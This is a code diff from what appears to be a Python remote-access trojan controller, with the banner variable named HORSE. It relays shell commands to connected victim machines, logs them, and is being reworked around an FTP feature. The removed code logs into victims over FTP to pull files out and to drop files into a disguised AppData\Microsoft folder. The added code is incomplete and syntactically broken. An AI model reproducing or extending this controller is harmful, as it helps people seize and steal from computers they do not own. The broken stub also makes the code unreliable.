@@ -95,6 +95,8 @@ HORSE ="""
 
 
 
+def ftp()
+
 
 
 
@@ -232,6 +234,12 @@ def connect(NickName):
                     log_saver(HostName,command)
                     if command == "clear" or command == "cls":
                         os.system('cls' if os.name == 'nt' else 'clear')
+                    elif command[0:3] == "ftp":
+                        # try:
+                        ftp_client(command.split()[1],command.split()[2],IP)
+                        # except:
+                            # print(colour.info("[*] Wrong command !!!"))
+                        break
                     elif command != "":
                         break
                 client.send(command.encode('utf-8'))
@@ -264,38 +272,7 @@ def lists():
 
 
 
-
-
-
-
-
-
-def download_file(ftp, filename, local_filename):
-    with open(local_filename, 'wb') as f:
-        ftp.retrbinary('RETR ' + filename, f.write)
-
-def upload_file(ftp, filename, remote_filename):
-    with open(filename, 'rb') as f:
-        ftp.storbinary('STOR ' + remote_filename, f)
-
-
-def ftp(NickName,command_type,file):
-    for each in data['client_list']:
-        if each['NickName'] == NickName:
-            IP = each["IP"]
-    for client in client_list : 
-        raddr = client.getpeername()[0] if client else None
-        if raddr == IP :
-            client.send(b'ftp')
-        with FTP(IP) as client:
-            client.login(user=ftpserver.ftp_username, passwd=ftpserver.ftp_password)
-            file_name = file.split("\\")[-1]
-            if command_type == "download":
-                download_file(client,file,f"./Data/ftp/{file_name}")
-            elif command == "upload":
-                upload_file(client,file,rf"~\AppData\Local\Microsoft\ftp\{file_name}")
-            client.send(b'close')
-        
+     
 
 
 
@@ -350,16 +327,7 @@ if __name__ == "__main__":
                 
             case "?":
                 print(HELP)
-            
-            case "ftp":
-                while True:
-                    command1 = input(f"{colour.NickName('FTP (download/upload)')}  {colour.arrow} ");print("\033[0m",end='')
-                    if command1 == "download" or command1 == "upload":
-                        break
-                    else:
-                        print(colour.info("[*] Wrong Input"))
-                command2= input(f"{colour.NickName('FTP (Input absolute path of file)')}  {colour.arrow} ");print("\033[0m",end='')
-                ftp(command[1],command1,command2)
+
                 
             case "clist":
                 print(client_list)
